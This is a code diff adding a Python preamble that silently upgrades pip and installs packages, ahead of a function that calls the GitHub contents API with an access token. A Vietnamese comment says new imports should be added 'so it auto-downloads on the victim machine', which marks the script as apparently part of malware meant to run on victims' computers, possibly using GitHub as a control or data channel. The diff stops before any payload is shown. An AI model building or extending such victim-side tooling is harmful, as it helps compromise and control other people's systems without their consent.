@@ -1,8 +1,46 @@
+import subprocess
+import sys
+from importlib import util
+def install(package):
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package], stderr=subprocess.DEVNULL)
+        return True
+    except subprocess.CalledProcessError:
+        print(f'[X] Error {package.capitalize()}')
+        return False
+    except Exception as e:
+        print(f'[X] Error {package.capitalize()}. Chi tiết: {e}')
+        return False
+def update_pip():
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], stderr=subprocess.DEVNULL)
+    except subprocess.CalledProcessError as e:
+        print(f'[X] Error update pip: {e}')
+        sys.exit(1)
+def print_install_status(lib, installed):
+    status = '[V] Installed' if installed else '[-] Installing'
+    print(f'{status} {lib.capitalize()}', end='\r')
+def check_and_install_libs(libs):
+    all_installed = True
+    for lib in libs:
+        spec = util.find_spec(lib)
+        if spec is None:
+            print_install_status(lib, False)
+            installed = install(lib)
+            if not installed:
+                all_installed = False
+                continue
+            print_install_status(lib, True)
+    return all_installed
+update_pip()
+libs_to_install = ['requests', 'time', 'threading','base64']
+all_installed = check_and_install_libs(libs_to_install)
+#------------------------------------------------------------------------------------------------------------------------------
+# Khi nào import thư viện khác vào thì nhớ thêm vào dòng 36 để nó tự tải về máy victim··
 import requests
 import time
 import threading
 import base64
-
 def get_file_info(repository, file_path, access_token):
     api_url = f"https://api.github.com/repos/{repository}/contents/{file_path}"
     headers = {
